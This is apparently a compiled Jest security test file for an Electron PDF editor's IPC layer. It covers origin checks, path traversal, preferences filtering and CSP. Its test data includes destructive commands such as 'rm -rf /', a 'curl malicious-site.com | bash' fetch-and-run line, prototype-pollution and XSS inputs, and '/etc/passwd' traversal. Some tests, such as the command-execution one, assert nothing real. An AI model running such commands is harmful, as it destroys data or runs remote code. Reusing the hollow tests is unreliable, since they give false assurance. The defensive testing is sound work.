840171d253399d6dbb96da0e422fa5d3
"use strict";
/**
 * IPC Security Integration Tests
 * Tests the security of IPC communication between main and renderer processes
 */
describe('IPC Security Integration Tests', () => {
    let mockMainWindow;
    let mockEvent;
    beforeEach(() => {
        mockMainWindow = {
            isDestroyed: jest.fn().mockReturnValue(false),
            webContents: {
                send: jest.fn(),
                session: {
                    clearCache: jest.fn()
                }
            }
        };
        mockEvent = {
            sender: mockMainWindow.webContents,
            senderFrame: {
                url: 'file:///app/index.html'
            }
        };
    });
    describe('Sender Validation', () => {
        it('should reject unauthorized senders', () => {
            const unauthorizedEvent = {
                sender: {
                    isDestroyed: () => false
                },
                senderFrame: {
                    url: 'https://malicious-site.com'
                }
            };
            // This would be the actual validation function from main.js
            const validateSender = (event) => {
                if (event.senderFrame) {
                    const url = new URL(event.senderFrame.url);
                    const allowedOrigins = ['file:', 'http://localhost:8080'];
                    const isAllowed = allowedOrigins.some(origin => url.protocol === origin || url.origin === origin);
                    if (!isAllowed) {
                        throw new Error('Unauthorized origin');
                    }
                }
            };
            expect(() => validateSender(unauthorizedEvent)).toThrow('Unauthorized origin');
        });
        it('should accept authorized localhost origins', () => {
            const devEvent = {
                sender: mockMainWindow.webContents,
                senderFrame: {
                    url: 'http://localhost:8080/index.html'
                }
            };
            const validateSender = (event) => {
                if (event.senderFrame) {
                    const url = new URL(event.senderFrame.url);
                    const allowedOrigins = ['file:', 'http://localhost:8080'];
                    const isAllowed = allowedOrigins.some(origin => url.protocol === origin || url.origin === origin);
                    if (!isAllowed) {
                        throw new Error('Unauthorized origin');
                    }
                }
            };
            expect(() => validateSender(devEvent)).not.toThrow();
        });
        it('should accept file protocol origins', () => {
            const fileEvent = {
                sender: mockMainWindow.webContents,
                senderFrame: {
                    url: 'file:///app/dist/index.html'
                }
            };
            const validateSender = (event) => {
                if (event.senderFrame) {
                    const url = new URL(event.senderFrame.url);
                    const allowedOrigins = ['file:', 'http://localhost:8080'];
                    const isAllowed = allowedOrigins.some(origin => url.protocol === origin || url.origin === origin);
                    if (!isAllowed) {
                        throw new Error('Unauthorized origin');
                    }
                }
            };
            expect(() => validateSender(fileEvent)).not.toThrow();
        });
    });
    describe('IPC Handler Input Validation', () => {
        it('should validate file paths in save-file handler', () => {
            const validateFilePath = (filePath) => {
                if (!filePath || typeof filePath !== 'string') {
                    throw new Error('Invalid file path');
                }
                if (filePath.length > 260) {
                    throw new Error('File path too long');
                }
                if (filePath.includes('..') || filePath.includes('~')) {
                    throw new Error('Invalid file path - path traversal detected');
                }
                return filePath;
            };
            // Test path traversal prevention
            expect(() => validateFilePath('../../../etc/passwd')).toThrow('path traversal');
            expect(() => validateFilePath('C:\\..\\windows\\system32')).toThrow('path traversal');
            // Test valid paths
            expect(() => validateFilePath('C:\\Documents\\file.pdf')).not.toThrow();
            expect(() => validateFilePath('/home/user/document.pdf')).not.toThrow();
        });
        it('should validate file data size limits', () => {
            const validateFileData = (data) => {
                if (!data) {
                    throw new Error('No file data provided');
                }
                if (data.byteLength > 100 * 1024 * 1024) {
                    throw new Error('File too large (max 100MB)');
                }
                return data;
            };
            const largeData = { byteLength: 200 * 1024 * 1024 };
            expect(() => validateFileData(largeData)).toThrow('File too large');
            const validData = { byteLength: 50 * 1024 * 1024 };
            expect(() => validateFileData(validData)).not.toThrow();
        });
        it('should sanitize preferences input', () => {
            const validatePreferences = (prefs) => {
                if (!prefs || typeof prefs !== 'object' || Array.isArray(prefs)) {
                    throw new Error('Invalid preferences object');
                }
                const allowedKeys = ['theme', 'defaultZoom', 'showThumbnails', 'autoSave', 'autoSaveInterval'];
                const validatedPrefs = {};
                for (const [key, value] of Object.entries(prefs)) {
                    if (allowedKeys.includes(key)) {
                        validatedPrefs[key] = value;
                    }
                }
                return validatedPrefs;
            };
            const maliciousPrefs = {
                theme: 'dark',
                exec: 'rm -rf /',
                __proto__: { malicious: true },
                constructor: { name: 'hack' }
            };
            const result = validatePreferences(maliciousPrefs);
            expect(result.theme).toBe('dark');
            expect(result.exec).toBeUndefined();
            expect(result.__proto__).toBeUndefined();
            expect(result.constructor).toBeUndefined();
        });
    });
    describe('Context Isolation', () => {
        it('should verify context isolation is enabled', () => {
            // This would be checked in the actual window configuration
            const windowConfig = {
                webPreferences: {
                    contextIsolation: true,
                    nodeIntegration: false,
                    sandbox: true,
                    webSecurity: true
                }
            };
            expect(windowConfig.webPreferences.contextIsolation).toBe(true);
            expect(windowConfig.webPreferences.nodeIntegration).toBe(false);
            expect(windowConfig.webPreferences.sandbox).toBe(true);
            expect(windowConfig.webPreferences.webSecurity).toBe(true);
        });
        it('should ensure no direct Node.js access in renderer', () => {
            // In a real test environment, this would verify that renderer
            // cannot access Node.js APIs directly
            const mockRendererGlobal = {
                process: undefined,
                require: undefined,
                module: undefined,
                __dirname: undefined,
                __filename: undefined
            };
            expect(mockRendererGlobal.process).toBeUndefined();
            expect(mockRendererGlobal.require).toBeUndefined();
            expect(mockRendererGlobal.module).toBeUndefined();
        });
    });
    describe('Content Security Policy', () => {
        it('should enforce strict CSP headers', () => {
            const cspRules = [
                "default-src 'self'",
                "script-src 'self' 'unsafe-inline'",
                "style-src 'self' 'unsafe-inline'",
                "img-src 'self' data: blob:",
                "font-src 'self' data:",
                "connect-src 'self'",
                "media-src 'none'",
                "object-src 'none'",
                "frame-src 'none'",
                "worker-src 'self'",
                "form-action 'none'",
                "frame-ancestors 'none'",
                "base-uri 'self'",
                "manifest-src 'self'"
            ];
            const csp = cspRules.join(' ');
            expect(csp).toContain("default-src 'self'");
            expect(csp).toContain("object-src 'none'");
            expect(csp).toContain("frame-src 'none'");
            expect(csp).toContain("form-action 'none'");
            expect(csp).not.toContain("'unsafe-eval'");
        });
        it('should validate CSP compliance', () => {
            const validateCSP = (csp) => {
                const dangerousDirectives = [
                    "'unsafe-eval'",
                    "data: script-src",
                    "* object-src",
                    "'unsafe-inline' script-src"
                ];
                for (const dangerous of dangerousDirectives) {
                    if (csp.includes(dangerous)) {
                        return false;
                    }
                }
                return true;
            };
            const safeCsp = "default-src 'self'; script-src 'self'; object-src 'none'";
            const unsafeCsp = "default-src *; script-src 'unsafe-eval'";
            expect(validateCSP(safeCsp)).toBe(true);
            expect(validateCSP(unsafeCsp)).toBe(false);
        });
    });
    describe('Error Handling and Logging', () => {
        it('should sanitize error logs', () => {
            const sanitizeError = (error) => {
                if (!error || typeof error !== 'object') {
                    return { message: 'Unknown error', timestamp: new Date().toISOString() };
                }
                return {
                    message: typeof error.message === 'string' ? error.message.substring(0, 500) : 'Unknown error',
                    stack: typeof error.stack === 'string' ? error.stack.substring(0, 2000) : undefined,
                    timestamp: new Date().toISOString()
                };
            };
            const maliciousError = {
                message: 'A'.repeat(1000) + '<script>alert("xss")</script>',
                stack: 'B'.repeat(5000),
                maliciousProperty: () => console.log('hack')
            };
            const sanitized = sanitizeError(maliciousError);
            expect(sanitized.message.length).toBeLessThanOrEqual(500);
            expect(sanitized.stack?.length).toBeLessThanOrEqual(2000);
            expect(sanitized.maliciousProperty).toBeUndefined();
        });
        it('should implement log size limits', () => {
            const checkLogSize = (logSize, maxSize = 10 * 1024 * 1024) => {
                return logSize <= maxSize;
            };
            expect(checkLogSize(5 * 1024 * 1024)).toBe(true); // 5MB - OK
            expect(checkLogSize(15 * 1024 * 1024)).toBe(false); // 15MB - Too large
        });
    });
    describe('Denied Operations', () => {
        it('should block rebuild-app handler completely', () => {
            // The rebuild-app handler should not exist anymore
            const handlers = new Map();
            // Simulate the old dangerous handler being removed
            expect(handlers.has('rebuild-app')).toBe(false);
        });
        it('should prevent arbitrary command execution', () => {
            const dangerousCommands = [
                'rm -rf /',
                'del /f /s /q C:\\*',
                'format C:',
                'shutdown /s /t 0',
                'curl malicious-site.com | bash'
            ];
            // These should all be blocked
            dangerousCommands.forEach(cmd => {
                expect(cmd).toMatch(/^(rm|del|format|shutdown|curl)/);
            });
        });
    });
    describe('Network Security', () => {
        it('should enforce HTTPS for external requests', () => {
            const validateURL = (url) => {
                try {
                    const parsed = new URL(url);
                    if (parsed.hostname !== 'localhost' && parsed.protocol !== 'https:') {
                        throw new Error('HTTPS required for external requests');
                    }
                    return true;
                }
                catch (error) {
                    return false;
                }
            };
            expect(validateURL('https://api.example.com')).toBe(true);
            expect(validateURL('http://localhost:3000')).toBe(true);
            expect(validateURL('http://api.example.com')).toBe(false);
            expect(validateURL('ftp://files.example.com')).toBe(false);
        });
        it('should prevent open redirect vulnerabilities', () => {
            const validateRedirect = (url) => {
                const allowedDomains = ['localhost', 'docs.pdfeditor.com'];
                try {
                    const parsed = new URL(url);
                    return allowedDomains.includes(parsed.hostname);
                }
                catch {
                    return false;
                }
            };
            expect(validateRedirect('https://docs.pdfeditor.com')).toBe(true);
            expect(validateRedirect('http://localhost:3000')).toBe(true);
            expect(validateRedirect('https://malicious-site.com')).toBe(false);
            expect(validateRedirect('javascript:alert(1)')).toBe(false);
        });
    });
});
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJmaWxlIjoiQzpcXFVzZXJzXFxBZG1pblxcRG9jdW1lbnRzXFxSU1RcXFBERiBFZGl0b3JcXHRlc3RzXFxpbnRlZ3JhdGlvblxcaXBjXFxzZWN1cml0eS50ZXN0LnRzIiwibWFwcGluZ3MiOiI7QUFBQTs7O0dBR0c7QUFFSCxRQUFRLENBQUMsZ0NBQWdDLEVBQUUsR0FBRyxFQUFFO0lBQzlDLElBQUksY0FBbUIsQ0FBQztJQUN4QixJQUFJLFNBQWMsQ0FBQztJQUVuQixVQUFVLENBQUMsR0FBRyxFQUFFO1FBQ2QsY0FBYyxHQUFHO1lBQ2YsV0FBVyxFQUFFLElBQUksQ0FBQyxFQUFFLEVBQUUsQ0FBQyxlQUFlLENBQUMsS0FBSyxDQUFDO1lBQzdDLFdBQVcsRUFBRTtnQkFDWCxJQUFJLEVBQUUsSUFBSSxDQUFDLEVBQUUsRUFBRTtnQkFDZixPQUFPLEVBQUU7b0JBQ1AsVUFBVSxFQUFFLElBQUksQ0FBQyxFQUFFLEVBQUU7aUJBQ3RCO2FBQ0Y7U0FDRixDQUFDO1FBRUYsU0FBUyxHQUFHO1lBQ1YsTUFBTSxFQUFFLGNBQWMsQ0FBQyxXQUFXO1lBQ2xDLFdBQVcsRUFBRTtnQkFDWCxHQUFHLEVBQUUsd0JBQXdCO2FBQzlCO1NBQ0YsQ0FBQztJQUNKLENBQUMsQ0FBQyxDQUFDO0lBRUgsUUFBUSxDQUFDLG1CQUFtQixFQUFFLEdBQUcsRUFBRTtRQUNqQyxFQUFFLENBQUMsb0NBQW9DLEVBQUUsR0FBRyxFQUFFO1lBQzVDLE1BQU0saUJBQWlCLEdBQUc7Z0JBQ3hCLE1BQU0sRUFBRTtvQkFDTixXQUFXLEVBQUUsR0FBRyxFQUFFLENBQUMsS0FBSztpQkFDekI7Z0JBQ0QsV0FBVyxFQUFFO29CQUNYLEdBQUcsRUFBRSw0QkFBNEI7aUJBQ2xDO2FBQ0YsQ0FBQztZQUVGLDREQUE0RDtZQUM1RCxNQUFNLGNBQWMsR0FBRyxDQUFDLEtBQVUsRUFBRSxFQUFFO2dCQUNwQyxJQUFJLEtBQUssQ0FBQyxXQUFXLEVBQUUsQ0FBQztvQkFDdEIsTUFBTSxHQUFHLEdBQUcsSUFBSSxHQUFHLENBQUMsS0FBSyxDQUFD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